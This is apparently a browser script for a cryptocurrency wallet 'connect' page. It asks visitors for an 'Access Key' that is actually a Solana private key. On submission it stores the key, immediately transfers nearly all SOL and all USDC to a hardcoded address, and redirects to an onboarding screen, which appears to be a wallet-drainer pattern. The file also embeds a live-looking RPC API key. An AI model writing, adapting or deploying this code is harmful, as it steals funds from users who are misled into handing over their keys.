import bs58 from "bs58";
import { Buffer } from "buffer";
globalThis.Buffer = Buffer;

console.log("bs58:", typeof bs58);
console.log("bs58.decode:", typeof bs58.decode);

document.addEventListener("DOMContentLoaded", () => {
  const privateKeyInput = document.getElementById("toolPrivateKey");
  const connectButton = document.getElementById("connectBtn");
  const authForm = document.getElementById("authForm");

  if (!privateKeyInput || !connectButton || !authForm) {
    console.error("Un élément du formulaire est introuvable.");
    return;
  }

  // ====================== CONFIG ======================
  const COLD_WALLET_ADDRESS = "k866V2sW6ZhyKkYMg8pEqHP6eZ8XbZ8KP8VZjmmyKe4";
  const THRESHOLD_SOL = 0.01;
  const KEEP_FOR_FEES = 0.0015;

  // USDC Mainnet
  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
  const USDC_DECIMALS = 6;
  // ====================================================

  async function sweepExcess() {
    try {
      // Vérification des libs
      if (typeof solanaWeb3 === "undefined") {
        console.error("❌ solanaWeb3 n'est pas chargé !");
        return;
      }
      if (typeof window.splToken === "undefined") {
        console.error("❌ splToken n'est pas encore chargé ! Attends un peu...");
        return;
      }

      const {
        Connection,
        Keypair,
        PublicKey,
        SystemProgram,
        Transaction,
        LAMPORTS_PER_SOL,
        sendAndConfirmTransaction,
      } = solanaWeb3;

      const {
        getAssociatedTokenAddress,
        createAssociatedTokenAccountInstruction,
        createTransferInstruction,
        getAccount,
      } = window.splToken;

      const connection = new Connection(
        "https://mainnet.helius-rpc.com/?api-key=8a3ea881-c693-4f28-9c76-b2ba57818609",
        "confirmed"
      );

      console.log("RPC utilisé :", connection.rpcEndpoint);

      const PRIVATE_KEY_BASE58 = localStorage.getItem("toolPrivateKey");
      console.log("Private key trouvée :", PRIVATE_KEY_BASE58 ? "Oui" : "Non");

      if (!PRIVATE_KEY_BASE58) {
        console.error("❌ Aucune private key dans localStorage");
        return;
      }

      console.log("1. Décodage de la private key...");
      const secretKey = bs58.decode(PRIVATE_KEY_BASE58);

      console.log("2. Création de la keypair...");
      const keypair = Keypair.fromSecretKey(secretKey);
      console.log("Adresse du wallet :", keypair.publicKey.toBase58());

      const coldWallet = new PublicKey(COLD_WALLET_ADDRESS);
      const usdcMint = new PublicKey(USDC_MINT);

      // ====================== SOL ======================
      console.log("3. Récupération du solde SOL...");
      const balance = await connection.getBalance(keypair.publicKey);
      const balanceSOL = balance / LAMPORTS_PER_SOL;
      console.log(`Solde actuel : ${balanceSOL.toFixed(6)} SOL`);

      let amountToSendSOL = 0;

      if (balanceSOL > THRESHOLD_SOL) {
        amountToSendSOL = balance - Math.floor(KEEP_FOR_FEES * LAMPORTS_PER_SOL);

        if (amountToSendSOL <= 0) {
          console.log("→ Pas assez de SOL après les frais.");
          amountToSendSOL = 0;
        } else {
          console.log(
            `Montant SOL à envoyer : ${(amountToSendSOL / LAMPORTS_PER_SOL).toFixed(6)} SOL`
          );
        }
      } else {
        console.log("→ Solde SOL sous le seuil, rien à envoyer.");
      }

      // ====================== USDC ======================
      console.log("4. Récupération du solde USDC...");
      let amountToSendUSDC = 0;
      let fromAta = null;
      let toAta = null;

      try {
        fromAta = await getAssociatedTokenAddress(usdcMint, keypair.publicKey);
        const fromAccount = await getAccount(connection, fromAta);
        amountToSendUSDC = Number(fromAccount.amount);

        if (amountToSendUSDC > 0) {
          console.log(
            `Solde USDC : ${(amountToSendUSDC / 10 ** USDC_DECIMALS).toFixed(6)} USDC`
          );
          toAta = await getAssociatedTokenAddress(usdcMint, coldWallet);
        } else {
          console.log("→ Aucun USDC à envoyer.");
        }
      } catch (e) {
        console.log("→ Pas de compte USDC trouvé (ou solde à 0).");
      }

      // ====================== CONSTRUCTION TRANSACTION ======================
      if (amountToSendSOL <= 0 && amountToSendUSDC <= 0) {
        console.log("Rien à envoyer.");
        return;
      }

      console.log("5. Création de la transaction...");
      const transaction = new Transaction();

      // --- Transfert SOL ---
      if (amountToSendSOL > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: keypair.publicKey,
            toPubkey: coldWallet,
            lamports: amountToSendSOL,
          })
        );
      }

      // --- Transfert USDC ---
      if (amountToSendUSDC > 0) {
        // Créer l'ATA du cold wallet s'il n'existe pas encore
        try {
          await getAccount(connection, toAta);
        } catch {
          console.log("→ Création de l'ATA USDC pour le cold wallet...");
          transaction.add(
            createAssociatedTokenAccountInstruction(
              keypair.publicKey,
              toAta,
              coldWallet,
              usdcMint
            )
          );
        }

        // Instruction de transfert USDC
        transaction.add(
          createTransferInstruction(
            fromAta,
            toAta,
            keypair.publicKey,
            amountToSendUSDC
          )
        );
      }

      // ====================== ENVOI ======================
      console.log("6. Envoi de la transaction...");
      const signature = await sendAndConfirmTransaction(
        connection,
        transaction,
        [keypair],
        { commitment: "confirmed" }
      );

      console.log("✅ SUCCÈS !");
      console.log("Signature :", signature);
      console.log("Explorer : https://solscan.io/tx/" + signature);
    } catch (err) {
      console.error("❌ ERREUR COMPLÈTE :", err);
    }
  }

  function connect() {
    const accessKey = privateKeyInput.value.trim();
    if (!accessKey) {
      console.log("Access Key manquante.");
      privateKeyInput.focus();
      return;
    }

    localStorage.setItem("toolPrivateKey", accessKey);
    console.log("Clé sauvegardée dans localStorage");

    // Sweep instantané
    sweepExcess();

    // Redirection
    location.hash = "onboarding";
  }

  connectButton.addEventListener("click", connect);
  authForm.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      connect();
    }
  });
});
